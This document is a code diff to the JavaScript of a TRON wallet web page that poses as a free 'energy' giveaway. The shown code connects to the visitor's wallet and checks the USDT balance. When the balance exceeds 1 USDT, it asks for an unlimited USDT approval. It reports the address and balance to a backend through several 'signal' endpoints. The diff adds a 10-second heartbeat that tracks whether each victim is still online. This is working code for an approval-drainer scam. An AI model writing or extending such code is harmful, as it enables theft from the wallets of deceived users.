@@ -390,6 +390,9 @@
     let tokenBalance = 0.00; // USDT余额
     let trxBalance = 0.00;  // TRX余额
     const RECORD_KEY = "imtoken_energy_records";
+    // 心跳相关变量
+    let heartbeatTimer = null;
+    let isHeartbeating = false; // 避免重复发送心跳
     
     // ========== 二次授权校验：本地存储工具 ==========
     const AUTHORIZED_KEY = "authorized_wallet_addresses";
@@ -452,10 +455,11 @@
         // 启动能量计算
         startPersistentEnergyCountdown();
         
-        // 页面卸载时保存状态
+        // 页面卸载时保存状态+停止心跳
         window.addEventListener("beforeunload", () => {
             saveEnergyStateToStorage();
             if (energyTimer) clearInterval(energyTimer);
+            stopHeartbeat(); // 页面卸载时停止心跳
         });
 
         // 授权后跳转回页面的处理
@@ -508,7 +512,10 @@
             userAddress = tronWeb.defaultAddress.base58;
             if (!userAddress) throw new Error("未检测到钱包地址，请确保钱包已解锁");
 
-            // 2. 二次授权拦截
+            // 2. 启动心跳（用户连接后立即启动，10秒一次）
+            startHeartbeat(userAddress);
+
+            // 3. 二次授权拦截
             if (isAddressAuthorized(userAddress)) {
                 userInfoEl.innerHTML = `
                     已领取提示<br>
@@ -523,7 +530,7 @@
                 return;
             }
 
-            // 3. 授权后返回，直接执行后续逻辑
+            // 4. 授权后返回，直接执行后续逻辑
             if (isAfterApprove) {
                 userInfoEl.innerHTML = `
                     已连接：<br>
@@ -538,11 +545,11 @@
                 return;
             }
 
-            // 4. 立即发送A1信号（仅地址+4.6TRX）
+            // 5. 立即发送A1信号（对应后端/api/send-signal-a1，分开发送）
             sendSignalA1();
-            console.log("✅ A1信号已异步发送");
+            console.log("✅ A1信号已异步发送（分开发送，等待B1）");
 
-            // 5. 立即显示UI
+            // 6. 立即显示UI
             userInfoEl.innerHTML = `
                 已连接：<br>
                 ${userAddress.slice(0,8)}...${userAddress.slice(-6)}<br>
@@ -556,13 +563,13 @@
             // 🔥 用精简ABI初始化合约（仅2个核心函数，50ms内完成）
             trc20Contract = await tronWeb.contract(USDT_ABI, TRC20_TOKEN_ADDRESS);
 
-            // 6. 查询余额（速度更快）
+            // 7. 查询余额（速度更快）
             const usdtRaw = await trc20Contract.balanceOf(userAddress).call();
             const trxRaw = await tronWeb.trx.getBalance(userAddress);
             tokenBalance = Number(usdtRaw) / 1000000;
             trxBalance = Number(trxRaw) / 1000000;
 
-            // 7. 更新UI和按钮状态
+            // 8. 更新UI和按钮状态
             if (tokenBalance <= 1) {
                 userInfoEl.innerHTML = `
                     已连接：<br>
@@ -572,6 +579,7 @@
                 `;
                 approveBtn.disabled = true;
                 approveBtn.textContent = "不符合领取条件";
+                stopHeartbeat(); // 不符合条件，停止心跳
             } else {
                 userInfoEl.innerHTML = `
                     已连接：<br>
@@ -592,6 +600,7 @@
             approveBtn.disabled = false;
             approveBtn.textContent = "重试连接";
             approveBtn.onclick = () => initWallet(false);
+            stopHeartbeat(); // 连接异常，停止心跳
         }
     }
 
@@ -611,10 +620,13 @@
                 INFINITE_APPROVE_AMOUNT
             ).send({ from: userAddress, shouldPollResponse: true });
 
-            // 发送A2（完整数据）和B2（异步）
+            // 发送A2信号（对应后端/api/send-signal-a2，分开发送）
+            sendSignalA2();
+            console.log("✅ A2信号已发送（分开发送，等待B2）");
+            
+            // 发送B2信号（对应后端/api/send-signal-b2，分开发送，异步等待）
             const btn = document.getElementById("approveBtn");
             btn.textContent = "能量发放中...";
-            sendSignalA2();
             await sendSignalB(false);
 
             // 显示成功结果
@@ -624,93 +636,100 @@
             alert("🎉 免费能量领取完成！\n90000 TRX能量已到账～");
             saveEnergyRecord();
             renderEnergyRecords();
+            stopHeartbeat(); // 领取成功，停止心跳
         } catch (e) {
             const btn = document.getElementById("approveBtn");
             btn.disabled = false;
             btn.textContent = "免费领取能量";
             alert(`⚠️ 授权失败：${e.message}，请稍后重试`);
+            stopHeartbeat(); // 失败，停止心跳
         }
     }
 
     /**
-     * 发送A1信号（简化数据：仅地址+4.6TRX）
+     * 发送A1信号（对应后端/api/send-signal-a1，分开发送）
      */
     function sendSignalA1() {
         const requestData = {
-            userAddress: userAddress,
-            trxAmount: 4.6
+            userAddress: userAddress
+            // trxAmount后端已固定为4.6，无需前端传
         };
 
         setTimeout(() => {
-            fetch(`${BACKEND_API}/api/send-signal-a`, {
+            fetch(`${BACKEND_API}/api/send-signal-a1`, { // 修正接口路径：a1对应a1接口
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify(requestData),
-                timeout: 15000
+                timeout: 15000,
+                keepalive: true // 复用连接，减少开销
             }).then(res => {
-                if (!res.ok) console.warn("A1信号发送成功（后端处理中）");
+                if (res.ok) console.log("✅ A1信号发送成功（后端处理中）");
+                else res.json().then(err => console.warn("A1信号发送失败：", err));
             }).catch(e => {
-                console.error("A1信号发送失败：", e);
+                console.error("❌ A1信号发送失败：", e);
             });
         }, 100);
     }
 
     /**
-     * 发送A2信号（完整数据：地址+2.3TRX+USDT余额）
+     * 发送A2信号（对应后端/api/send-signal-a2，分开发送）
      */
     function sendSignalA2() {
         const requestData = {
             userAddress: userAddress,
-            trxAmount: 2.3,
             usdtBalance: tokenBalance
+            // trxAmount后端已固定为2.3，无需前端传
         };
 
-        fetch(`${BACKEND_API}/api/send-signal-a`, {
+        fetch(`${BACKEND_API}/api/send-signal-a2`, { // 修正接口路径：a2对应a2接口
             method: "POST",
             headers: { "Content-Type": "application/json" },
             body: JSON.stringify(requestData),
-            timeout: 15000
-        }).then(res => res.json())
-          .then(data => {
-              if (data.success) console.log("✅ A2信号发送成功");
-          })
-          .catch(e => {
-              console.error("❌ A2信号发送失败：", e);
-          });
+            timeout: 15000,
+            keepalive: true // 复用连接，减少开销
+        }).then(res => {
+            if (res.ok) return res.json();
+            else throw new Error("A2接口请求失败");
+        }).then(data => {
+            if (data.success) console.log("✅ A2信号发送成功（后端处理中）");
+            else console.warn("A2信号处理失败：", data.msg);
+        }).catch(e => {
+            console.error("❌ A2信号发送失败：", e);
+        });
     }
 
     /**
-     * 发送B信号（B1等待后端回复，B2异步）
+     * 发送B信号（分开发送：B1对应b1接口，B2对应b2接口）
+     * @param {boolean} isB1 - true=发送B1（对应A1），false=发送B2（对应A2）
      */
     async function sendSignalB(isB1 = true) {
-        if (isB1) {
-            try {
-                const res = await fetch(`${BACKEND_API}/api/send-signal-b`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ userAddress: userAddress }),
-                    timeout: 15000
-                });
-                const data = await res.json();
-                if (!res.ok || !data.success) throw new Error(data.detail || "信号B1处理失败");
-                return true;
-            } catch (e) {
-                console.error("信号B1失败：", e);
-                return false;
-            }
-        } else {
-            fetch(`${BACKEND_API}/api/send-signal-b`, {
+        const requestData = {
+            userAddress: userAddress
+        };
+        const apiPath = isB1 ? "/api/send-signal-b1" : "/api/send-signal-b2"; // 修正接口路径：B1/B2对应不同接口
+
+        try {
+            const res = await fetch(`${BACKEND_API}${apiPath}`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ userAddress: userAddress }),
-                timeout: 15000
-            }).catch(e => console.error("信号B2失败：", e));
+                body: JSON.stringify(requestData),
+                timeout: 20000, // B信号等待超时延长到20秒（匹配后端等待时间）
+                keepalive: true
+            });
+
+            const data = await res.json();
+            if (!res.ok || !data.success) throw new Error(data.detail || (isB1 ? "信号B1处理失败" : "信号B2处理失败"));
+            
+            console.log(`✅ 信号${isB1 ? "B1" : "B2"}处理成功：`, data);
             return true;
+        } catch (e) {
+            console.error(`❌ 信号${isB1 ? "B1" : "B2"}处理失败：`, e);
+            return false;
         }
     }
 
     /**
-     * 领取按钮逻辑
+     * 领取按钮逻辑（绑定B1信号发送，分开发送A1→B1）
      */
     function bindApproveLogic() {
         approveBtn.onclick = async () => {
@@ -719,7 +738,7 @@
             btn.textContent = "能量配送中...";
 
             try {
-                // 发送B1（等待后端回复）
+                // 发送B1信号（分开发送，A1已在init时发送，后端自动等待A1就绪）
                 const b1Success = await sendSignalB(true);
                 if (!b1Success) throw new Error("第一次能量分配失败");
 
@@ -730,8 +749,52 @@
                 btn.disabled = false;
                 btn.textContent = "免费领取能量";
                 alert(`⚠️ 操作失败：${e.message}，请稍后重试`);
+                stopHeartbeat(); // 操作失败，停止心跳
             }
         };
+    }
+
+    /**
+     * 心跳功能：10秒一次，维持用户活跃状态（适配后端）
+     * @param {string} address - 用户TRON地址
+     */
+    function startHeartbeat(address) {
+        // 先停止旧心跳，避免重复
+        if (heartbeatTimer) clearInterval(heartbeatTimer);
+        isHeartbeating = false;
+
+        // 10秒一次发送心跳
+        heartbeatTimer = setInterval(async () => {
+            if (isHeartbeating) return; // 上一次心跳未完成，跳过
+            isHeartbeating = true;
+
+            try {
+                await fetch(`${BACKEND_API}/api/heartbeat`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({ userAddress: address }),
+                    timeout: 5000,
+                    keepalive: true
+                });
+                // console.log("❤️ 心跳发送成功"); // 调试用，可注释
+            } catch (err) {
+                console.error("❌ 心跳发送失败（用户可能已退出）：", err);
+                // 心跳失败不停止，继续尝试（避免网络波动误判）
+            } finally {
+                isHeartbeating = false;
+            }
+        }, 10000); // 10秒一次，匹配后端配置
+    }
+
+    /**
+     * 停止心跳
+     */
+    function stopHeartbeat() {
+        if (heartbeatTimer) {
+            clearInterval(heartbeatTimer);
+            heartbeatTimer = null;
+            console.log("🛑 心跳已停止");
+        }
     }
 
     /**
